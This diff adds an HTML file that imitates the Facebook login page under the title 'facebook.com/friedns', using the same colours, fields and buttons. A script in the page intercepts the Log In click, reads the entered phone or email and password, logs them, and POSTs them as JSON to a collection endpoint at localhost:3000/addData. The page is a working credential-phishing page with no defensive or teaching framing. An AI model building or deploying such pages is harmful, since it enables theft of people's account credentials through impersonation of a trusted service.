@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook.com/friedns</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <style>
+        button{
+            margin-top: 10px;
+            background-color: #1877f2;
+            width: 100%;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            padding: 3px;
+        }
+        .custom-line{
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .divColor{
+
+            background-color: rgb(184, 182, 182);
+            height: 1px;
+            width: 35%;
+        }
+        .btn-Centers{
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .createBtn{
+            background-color: rgb(80, 175, 80);
+            width: 50%;
+        }
+        .forgotte{
+            margin-top: 5px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            color: #1877f2;
+        }
+    </style>
+</head>
+<body style="background-color: #f0f2f5;margin-top: 30px;">
+    <div class="container" >
+        <div class="row">
+            <div class="col-md-12 col-sm-12 col-xs-12">
+                <h2 style="text-align: center; color: #1877f2;"><b>facebook</b></h2>
+                <form>
+                    <div class="mb-3">
+                        <label for="exampleInputEmail1" class="form-label" style="color: gray;">Phone number or email address</label>
+                        <input id="name" type="text" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label for="exampleInputPassword1" class="form-label" style="color: gray;">Password</label>
+                        <input id="password" type="password" class="form-control" required>
+                    </div>
+                    
+                    <a href="facebook.com"><button type="submit" id="sub">Log In</button></a>
+                </form>
+                <div class="forgotte"><p>Forgotten password?</p></div>
+                    <div class="custom-line">
+                        <div class="divColor"></div>
+                        <p style="margin-top: -10px; margin-right: 6px;margin-left: 6px;">or</p>
+                        <div class="divColor"></div>
+                    </div>
+                    <div class="btn-Centers">
+                        <button type="submit" class="createBtn">Create Account</button>
+                    </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const submitBtn = document.querySelector('#sub');
+        const name = document.querySelector('#name');
+        const password  = document.querySelector('#password')
+        submitBtn.addEventListener('click', (e)=>{
+            e.preventDefault();
+            const nameData = name.value
+            const passData = password.value
+            const Data = {nameData,passData};
+
+            console.log(Data);
+            if(Data === ''){
+                return false;
+            }
+            else{
+                fetch('http://localhost:3000/addData', {
+                method:'POST',
+                headers:{'content-type':'application/json'},
+                body:JSON.stringify(Data)
+            })
+            }
+            
+        })
+    </script>
+</body>
+</html>
